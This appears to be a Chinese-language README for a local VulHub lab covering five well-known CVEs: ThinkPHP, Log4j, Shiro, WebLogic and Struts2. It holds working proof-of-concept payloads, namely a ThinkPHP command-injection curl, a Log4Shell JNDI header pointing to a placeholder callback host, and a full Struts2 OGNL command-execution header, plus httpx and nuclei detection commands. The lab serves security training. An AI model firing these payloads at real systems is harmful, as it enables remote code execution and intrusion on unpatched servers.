# VulHub CVE 专项靶场

> **独立启动**: `docker compose -f targets/vulhub/docker-compose.yml up -d <服务名>`
> **停止清理**: `docker compose -f targets/vulhub/docker-compose.yml down`
> **练习原则**: 每次只启动 1-2 个，练完即停，避免资源浪费

## 五个高价值 CVE

| CVE | 服务 | 端口 | 影响组件 | 练习技能 |
|:----|:-----|:-----|:---------|:---------|
| CVE-2018-20062 | ThinkPHP 5.0.23 | 8082 | ThinkPHP | `cmdi-command-injection` |
| CVE-2021-44228 | Log4j 2.14.1 | 8083 | Apache Log4j | `jndi-injection`, `jyso-exploit` |
| CVE-2016-4437 | Shiro 1.2.4 | 8084 | Apache Shiro | `deserialization-insecure`, `jyso-exploit` |
| CVE-2020-14882 | WebLogic 12.2.1.3 | 7001 | Oracle WebLogic | `deserialization-insecure` |
| CVE-2017-5638 | Struts2 2.3.32 | 8085 | Apache Struts2 | `expression-language-injection` |

## 练习指南

### 1. ThinkPHP 5.x RCE (CVE-2018-20062)

```bash
docker compose -f targets/vulhub/docker-compose.yml up -d thinkphp5-rce

# 检测
httpx -u http://localhost:8082 -tech-detect

# 利用 (PoC)
curl "http://localhost:8082/index.php?s=captcha" \
  -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"

# 查 flag
curl "http://localhost:8082/index.php?s=captcha" \
  -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag"

# 练习完毕后
docker compose -f targets/vulhub/docker-compose.yml down
```

**对应技能**: `cmdi-command-injection`, `pentest-master`（框架识别 → CVE 匹配）

### 2. Log4Shell (CVE-2021-44228)

```bash
docker compose -f targets/vulhub/docker-compose.yml up -d log4j-cve

# 检测 (使用 dnslog / interactsh 确认出站连接)
curl "http://localhost:8083/hello" \
  -H 'payload: ${jndi:ldap://<your-dnslog-host>/test}'

# 利用 JYso 启动 LDAP 服务 (需要在同一网络或有公网 IP)
# 详见 skills/pentest_skills/jyso-exploit/SKILL.md
```

**对应技能**: `jndi-injection`, `jyso-exploit`

### 3. Shiro RememberMe 反序列化 (CVE-2016-4437)

```bash
docker compose -f targets/vulhub/docker-compose.yml up -d shiro-cve

# 检测 Shiro (检查 Set-Cookie 中是否有 rememberMe=deleteMe)
httpx -u http://localhost:8084 -tech-detect
curl -v http://localhost:8084/ 2>&1 | grep -i shiro

# 使用 nuclei 检测
nuclei -u http://localhost:8084 -tags shiro
```

**对应技能**: `deserialization-insecure`, `jyso-exploit`

### 4. WebLogic 反序列化 (CVE-2020-14882)

```bash
docker compose -f targets/vulhub/docker-compose.yml up -d weblogic-cve
# WebLogic 启动较慢，需等待 2-3 分钟

# 检测 WebLogic
httpx -u http://localhost:7001 -tech-detect
nuclei -u http://localhost:7001 -tags weblogic
```

### 5. Struts2 S2-045 (CVE-2017-5638)

```bash
docker compose -f targets/vulhub/docker-compose.yml up -d struts2-cve

# OGNL 注入 PoC
curl http://localhost:8085/ \
  -H "Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

## 练习记录建议

每次 CVE 练习后，使用项目经验模板记录：

```bash
# 复制模板
cp memory/templates/pentest-experience-template.md memory/pentest-experience-009.md

# 编辑记录关键信息:
# - CVE 编号和影响版本
# - 检测方法 (httpx/nuclei/shodan/fofa)
# - 利用工具和参数
# - WAF 绕过情况
# - 修复建议
```
